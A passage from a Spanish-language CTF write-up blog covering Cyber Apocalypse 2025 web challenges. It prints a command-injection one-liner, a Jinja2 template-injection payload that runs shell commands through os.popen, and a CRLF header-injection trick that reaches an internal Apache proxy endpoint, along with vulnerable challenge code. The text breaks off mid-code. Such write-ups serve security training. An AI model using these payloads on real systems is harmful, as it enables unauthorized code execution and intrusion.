<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Cyber Apocalypse 2025 - 6x Web Challenges Writeup" /><meta property="og:locale" content="en" /><meta name="description" content="I participated as a member of team CibersecUNI. This time i managed to solve all 6/6 challenges in the web category." /><meta property="og:description" content="I participated as a member of team CibersecUNI. This time i managed to solve all 6/6 challenges in the web category." /><link rel="canonical" href="https://s4yhii.github.io/posts/CyberApocalypse-CTF2025-Web/" /><meta property="og:url" content="https://s4yhii.github.io/posts/CyberApocalypse-CTF2025-Web/" /><meta property="og:site_name" content="s4yhii’s Blog" /><meta property="og:image" content="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/ca2025.jpg" /><meta property="og:image:height" content="1400" /><meta property="og:image:width" content="700" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-03-25T08:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/ca2025.jpg" /><meta property="twitter:title" content="Cyber Apocalypse 2025 - 6x Web Challenges Writeup" /><meta name="twitter:site" content="@s4yhii" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-03-30T02:20:10-05:00","datePublished":"2025-03-25T08:00:00-05:00","description":"I participated as a member of team CibersecUNI. This time i managed to solve all 6/6 challenges in the web category.","headline":"Cyber Apocalypse 2025 - 6x Web Challenges Writeup","image":{"height":1400,"width":700,"url":"https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/ca2025.jpg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4yhii.github.io/posts/CyberApocalypse-CTF2025-Web/"},"url":"https://s4yhii.github.io/posts/CyberApocalypse-CTF2025-Web/"}</script><title>Cyber Apocalypse 2025 - 6x Web Challenges Writeup | s4yhii's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="s4yhii's Blog"><meta name="application-name" content="s4yhii's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/streams/dance-pikachu.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">s4yhii's Blog</a></div><div class="site-subtitle font-italic">Appsec blog, CTF write-ups and more</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/s4yhii" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/s4yhii" aria-label="twitter" target="_blank" rel="noopener"> <i class="fa-brands fa-x-twitter"></i> </a> <a href="https://www.linkedin.com/in/jesusluj4n" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://app.hackthebox.com/profile/274780" aria-label="HackTheBox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Cyber Apocalypse 2025 - 6x Web Challenges Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Cyber Apocalypse 2025 - 6x Web Challenges Writeup</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1742907600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 25, 2025 </em> </span> <span> Updated <em class="" data-ts="1743319210" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 30, 2025 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 1400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/ca2025.jpg" class="preview-img bg" alt="Preview Image" width="700" height="1400" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/s4yhii">Jesus Lujan</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1348 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><p>I participated as a member of team <strong>CibersecUNI</strong>. This time i managed to solve all 6/6 challenges in the web category.</p><h1 id="whispers-of-the-moonbeam">Whispers of the Moonbeam</h1><p>Observando las funciones, nos dan una pista que se puede inyectar comandos con ;.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-1.png" alt="alt text" data-proofer-ignore></p><p>Usando el comando gossip, puedo listar los archivos, se visualiza el archivo flag.txt, y con un simple ; puedo concatenar el comando cat para leer la flag.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gossip<span class="p">;</span> <span class="nb">cat </span>flag.txt
</pre></table></code></div></div><p>Obtenemos la flag. 🎉 HTB{Sh4d0w_3x3cut10n_1n_Th3_M00nb34m_T4v3rn_78cb9b70be3bf077e608865b967b5ab1}</p><p>Este fue un challenge muy directo de inyeccion de comandos.</p><h1 id="trial-by-fire">Trial by Fire</h1><ul><li>📦 <a href="https://github.com/s4yhii/s4yhii.github.io/raw/master/assets/zip/web_trial_by_fire.zip">web_trial_by_fire.zip</a></ul><p>Observando la UI, nos da una pista sobre SSTI.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-2.png" alt="alt text" data-proofer-ignore></p><p>El reto nos muestra un campo en el cual podemos ingresar un nombre de usuario, el código de las rutas es:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="nd">@web.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/begin</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">begin_journey</span><span class="p">():</span>
    <span class="n">warrior_name</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">warrior_name</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">).</span><span class="nf">strip</span><span class="p">()</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">warrior_name</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">web.index</span><span class="sh">'</span><span class="p">))</span>

    <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">warrior_name</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">warrior_name</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">intro.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">warrior_name</span><span class="o">=</span><span class="n">warrior_name</span><span class="p">)</span>

<span class="nd">@web.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/flamedrake</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">flamedrake</span><span class="p">():</span>
    <span class="n">warrior_name</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">warrior_name</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">warrior_name</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">web.index</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">"</span><span class="s">flamedrake.html</span><span class="sh">"</span><span class="p">,</span> <span class="n">warrior_name</span><span class="o">=</span><span class="n">warrior_name</span><span class="p">)</span>

<span class="nd">@web.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/battle-report</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">battle_report</span><span class="p">():</span>
    <span class="n">warrior_name</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">warrior_name</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Unknown Warrior</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">battle_duration</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">battle_duration</span><span class="sh">'</span><span class="p">,</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">stats</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">'</span><span class="s">damage_dealt</span><span class="sh">'</span><span class="p">:</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">damage_dealt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">),</span>
        <span class="sh">'</span><span class="s">damage_taken</span><span class="sh">'</span><span class="p">:</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">damage_taken</span><span class="sh">'</span><span class="p">,</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">),</span>
        <span class="sh">'</span><span class="s">spells_cast</span><span class="sh">'</span><span class="p">:</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">spells_cast</span><span class="sh">'</span><span class="p">,</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">),</span>
        <span class="sh">'</span><span class="s">turns_survived</span><span class="sh">'</span><span class="p">:</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">turns_survived</span><span class="sh">'</span><span class="p">,</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">),</span>
        <span class="sh">'</span><span class="s">outcome</span><span class="sh">'</span><span class="p">:</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">outcome</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">defeat</span><span class="sh">'</span><span class="p">)</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>Se ingresa el payload 7*7 para validar si en alguna ruta ese valor se renderiza al usar una plantilla y nos muestra el valor de 49.</p><p>En la ruta /flamedrake se observa que no se renderiza el payload ingresado, esto debido a que se toma el valor como string.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-9.png" alt="" data-proofer-ignore></p><p>Buscando otras rutas donde se renderiza el payload, se encuentra que en la ruta /battle-reports, nuestro payload se envía como parámetro y se renderiza el valor en la plantilla, lo cual hace que se visualize 49 en la respuesta.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-10.png" alt="" data-proofer-ignore></p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"warrior-info"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"nes-icon is-large heart"</span><span class="nt">&gt;&lt;/i&gt;</span>
    <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"nes-text is-primary warrior-name"</span><span class="nt">&gt;</span>{warrior_name}<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-11.png" alt="alt text" data-proofer-ignore></p><p>Luego de verificar que efectivamente nuestro payload se renderiza como 49 en la respuesta, elaboramos nuestro payload para leer la flag.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-12.png" alt="" data-proofer-ignore></p><p>Usaremos el siguiente payload, extraido de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---basic-injection">Payload all the things</a>, pero con las modificaciones necesarios para leer la flag.</p><div class="language-liquid highlighter-rouge"><div class="code-header"> <span data-label-text="Liquid"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>warrior_name=<span class="cp">{{</span><span class="nv">self</span><span class="p">.</span><span class="nv">_TemplateReference__context</span><span class="p">.</span><span class="nv">cycler</span><span class="p">.</span><span class="nv">__init__</span><span class="p">.</span><span class="nv">__globals__</span><span class="p">.</span><span class="nv">os</span><span class="p">.</span><span class="nv">popen</span>('cat%20flag.txt').read()}}<span class="w">
</span></pre></table></code></div></div><p>Luego de inyectar nuestro payload para leer la flag, se puedo visualizar en la UI de la ruta /battle-reports nuestra flag.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-6.png" alt="alt text" data-proofer-ignore></p><p>O desde Caido usando la funcion de replay.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-13.png" alt="" data-proofer-ignore></p><p>Se obtiene la flag. 🎉 HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_9c285b69f155f1d253dfefe5fe30667d}</p><h1 id="cyber-attack">Cyber Attack</h1><p>Este reto tiene varios pasos, pero en general se abusará de CRLF Injection + Proxy + RCE</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-14.png" alt="" data-proofer-ignore></p><p>Se observa un panel con 2 campos, name y domain, solo se puede usar el boton de Attack a Domain, ya que el boton de Attack an IP solo se puede realizar desde localhost. Gracias a esta porción de código en el index.php</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="c1">// Check if the user's IP is local</span>
<span class="kd">const</span> <span class="nx">isLocalIP</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ip</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">ip</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">127.0.0.1</span><span class="dl">"</span> <span class="o">||</span> <span class="nx">ip</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">::1</span><span class="dl">"</span> <span class="o">||</span> <span class="nx">ip</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">192.168.</span><span class="dl">"</span><span class="p">);</span>
<span class="p">};</span>

<span class="c1">// Get the user's IP address</span>
<span class="kd">const</span> <span class="nx">userIP</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;?php echo $_SERVER['REMOTE_ADDR']; ?&gt;</span><span class="dl">"</span><span class="p">;</span>

<span class="c1">// Enable/disable the "Attack IP" button based on the user's IP</span>
<span class="kd">const</span> <span class="nx">attackIPButton</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">attack-ip</span><span class="dl">"</span><span class="p">);</span>
</pre></table></code></div></div><p>attack-domain file:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nx">def</span> <span class="nf">is_domain</span><span class="p">(</span><span class="nx">target</span><span class="p">):</span>
    <span class="k">return</span> <span class="nx">re</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="nx">r</span><span class="dl">'</span><span class="s1">^(?!-)[a-zA-Z0-9-]{1,63}(?&lt;!-)</span><span class="se">\</span><span class="s1">.[a-zA-Z]{2,63}$</span><span class="dl">'</span><span class="p">,</span> <span class="nx">target</span><span class="p">)</span>

<span class="nx">form</span> <span class="o">=</span> <span class="nx">cgi</span><span class="p">.</span><span class="nc">FieldStorage</span><span class="p">()</span>
<span class="nx">name</span> <span class="o">=</span> <span class="nx">form</span><span class="p">.</span><span class="nf">getvalue</span><span class="p">(</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">)</span>
<span class="nx">target</span> <span class="o">=</span> <span class="nx">form</span><span class="p">.</span><span class="nf">getvalue</span><span class="p">(</span><span class="dl">'</span><span class="s1">target</span><span class="dl">'</span><span class="p">)</span>
<span class="k">if</span> <span class="nx">not</span> <span class="nx">name</span> <span class="nx">or</span> <span class="nx">not</span> <span class="nx">target</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="dl">'</span><span class="s1">Location: ../?error=Hey, you need to provide a name and a target!</span><span class="dl">'</span><span class="p">)</span>
    
<span class="nx">elif</span> <span class="nf">is_domain</span><span class="p">(</span><span class="nx">target</span><span class="p">):</span>
    <span class="nx">count</span> <span class="o">=</span> <span class="mi">1</span> <span class="err">#</span> <span class="nx">Increase</span> <span class="k">this</span> <span class="k">for</span> <span class="nx">an</span> <span class="nx">actual</span> <span class="nx">attack</span>
    <span class="nx">os</span><span class="p">.</span><span class="nf">popen</span><span class="p">(</span><span class="nx">f</span><span class="dl">'</span><span class="s1">ping -c {count} {target}</span><span class="dl">'</span><span class="p">)</span> 
    <span class="nf">print</span><span class="p">(</span><span class="nx">f</span><span class="dl">'</span><span class="s1">Location: ../?result=Succesfully attacked {target}!</span><span class="dl">'</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="nx">f</span><span class="dl">'</span><span class="s1">Location: ../?error=Hey {name}, watch it!</span><span class="dl">'</span><span class="p">)</span>
    
<span class="nf">print</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-Type: text/html</span><span class="dl">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">()</span>
</pre></table></code></div></div><p>Se observa que imprime Location: y Content-Type, pero no valida que name no incluya \r\n, lo que permite inyectar nuevas cabeceras HTTP, adicionalmente en el archivo Dockerfile se habilita el módulo proxy para Apache, el cual permite enviar peticiones a servicios http.</p><div class="language-docker highlighter-rouge"><div class="code-header"> <span data-label-text="Docker"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">RUN </span>a2enmod rewrite cgi proxy proxy_fcgi proxy_http
</pre></table></code></div></div><p>Ejemplo, si envío <code class="language-plaintext highlighter-rouge">name=a%0d%0aLocation: /a%0d%0aContent-Type: proxy:...</code>, se transforma en la siguiente respuesta.</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">/a</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">proxy:http://127.0.0.1/cgi-bin/attack-ip?target=...</span>
</pre></table></code></div></div><p>Ahora que ya encontramos la forma de hacer solicitudes internas es hora de abusar del endpoint /attack-ip, el cual tiene como código.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="n">cgi</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">from</span> <span class="n">ipaddress</span> <span class="kn">import</span> <span class="n">ip_address</span>

<span class="n">form</span> <span class="o">=</span> <span class="n">cgi</span><span class="p">.</span><span class="nc">FieldStorage</span><span class="p">()</span>
<span class="n">name</span> <span class="o">=</span> <span class="n">form</span><span class="p">.</span><span class="nf">getvalue</span><span class="p">(</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">)</span>
<span class="n">target</span> <span class="o">=</span> <span class="n">form</span><span class="p">.</span><span class="nf">getvalue</span><span class="p">(</span><span class="sh">'</span><span class="s">target</span><span class="sh">'</span><span class="p">)</span>

<span class="k">if</span> <span class="ow">not</span> <span class="n">name</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">target</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Location: ../?error=Hey, you need to provide a name and a target!</span><span class="sh">'</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">count</span> <span class="o">=</span> <span class="mi">1</span>  <span class="c1"># Increase this for an actual attack
</span>    <span class="n">os</span><span class="p">.</span><span class="nf">popen</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">ping -c </span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="nf">ip_address</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span> 
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Location: ../?result=Succesfully attacked </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">!</span><span class="sh">'</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
